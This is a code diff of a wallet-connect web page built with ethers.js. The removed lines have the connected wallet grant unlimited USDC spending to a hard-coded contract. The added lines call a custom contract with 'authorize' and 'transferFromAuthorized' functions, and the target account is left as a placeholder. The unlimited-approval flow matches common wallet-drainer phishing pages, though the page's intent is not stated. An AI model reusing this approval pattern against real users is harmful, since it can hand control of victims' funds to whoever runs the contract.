@@ -75,10 +75,131 @@
 
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
-        const tokenAddress = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"; // Example Token Address
-        const contractAddress = "0x67A0bCBC059358E96bF4e85B43FFB2a12f25e097"; // Example Contract Address
-        let provider, signer;
+        const contractAddress = "0x60F0532F89BCcdd7e3847531789de49d793f48f3"; // 新合约地址
+        const contractABI = [
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "_account",
+                        "type": "address"
+                    }
+                ],
+                "name": "authorize",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "_account",
+                        "type": "address"
+                    }
+                ],
+                "name": "revokeAuthorization",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "_from",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "address",
+                        "name": "_to",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "_amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "transferFromAuthorized",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "name": "authorized",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "_account",
+                        "type": "address"
+                    }
+                ],
+                "name": "isAuthorized",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "owner",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "token",
+                "outputs": [
+                    {
+                        "internalType": "contract IERC20",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            }
+        ];
 
+        let provider, signer, contract;
+
+        // Connect wallet function
         async function connectWallet() {
             if (typeof window.ethereum !== "undefined") {
                 try {
@@ -87,6 +208,7 @@
                     signer = provider.getSigner();
                     const walletAddress = await signer.getAddress();
                     document.getElementById("walletStatus").innerText = `Connected: ${walletAddress}`;
+                    contract = new ethers.Contract(contractAddress, contractABI, signer);
                     document.getElementById("authorizeButton").disabled = false;
                 } catch (error) {
                     alert("Failed to connect wallet.");
@@ -96,18 +218,17 @@
             }
         }
 
+        // Authorize contract function
         async function authorizeContract() {
             if (!signer) {
                 alert("Please connect your wallet first.");
                 return;
             }
 
-            const tokenABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
-            const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
-
+            const account = "0xAddressToAuthorize";  // 要授权的账户地址
             try {
-                const tx = await tokenContract.approve(contractAddress, ethers.constants.MaxUint256);
-                await tx.wait();  // Wait for transaction confirmation
+                const tx = await contract.authorize(account);
+                await tx.wait();  // 等待交易确认
                 alert("Wallet authorized successfully.");
             } catch (error) {
                 alert("Failed to authorize wallet.");
